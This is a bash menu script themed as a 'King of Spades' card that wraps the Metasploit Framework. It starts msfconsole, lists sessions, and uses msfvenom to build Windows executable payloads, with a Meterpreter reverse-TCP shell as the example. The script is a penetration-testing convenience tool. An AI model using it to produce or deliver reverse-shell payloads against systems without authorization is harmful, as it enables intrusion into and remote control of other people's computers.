#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the King of Spades Card
king_of_spades_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              King of Spades                              |"
    echo "     |                     Exploit Systems with Custom Payloads                 |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card provides an interactive interface to the Metasploit Framework.|"
    echo "     |  Generate, execute, and manage payloads or exploit sessions effectively. |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. Start Metasploit Console                                             |"
    echo "     |  2. Generate Payload                                                     |"
    echo "     |  3. View Active Sessions                                                 |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) start_msfconsole ;;
        2) generate_payload ;;
        3) view_sessions ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; king_of_spades_menu ;;
    esac
}

# Start Metasploit Console
start_msfconsole() {
    clear
    echo -e "${CYAN}Starting Metasploit Console...${RESET}"
    if command -v msfconsole &>/dev/null; then
        msfconsole
    else
        echo -e "${CYAN}Error: Metasploit Framework is not installed.${RESET}"
        echo "Please install it using your package manager or visit https://www.metasploit.com/."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    king_of_spades_menu
}

# Generate a payload
generate_payload() {
    clear
    echo -e "${CYAN}Generating a custom payload...${RESET}"
    if command -v msfvenom &>/dev/null; then
        read -p "Enter the payload (e.g., windows/meterpreter/reverse_tcp): " payload
        read -p "Enter the LHOST (local host IP): " lhost
        read -p "Enter the LPORT (local port): " lport
        read -p "Enter the output file name (e.g., payload.exe): " output_file

        msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f exe -o "$output_file"
        if [[ -f "$output_file" ]]; then
            echo -e "${CYAN}Payload saved to $output_file.${RESET}"
        else
            echo -e "${CYAN}Error: Payload generation failed.${RESET}"
        fi
    else
        echo -e "${CYAN}Error: msfvenom is not installed.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    king_of_spades_menu
}

# View active Metasploit sessions
view_sessions() {
    clear
    echo -e "${CYAN}Viewing active Metasploit sessions...${RESET}"
    if command -v msfconsole &>/dev/null; then
        msfconsole -x "sessions -l; exit"
    else
        echo -e "${CYAN}Error: Metasploit Framework is not installed.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    king_of_spades_menu
}

king_of_spades_menu
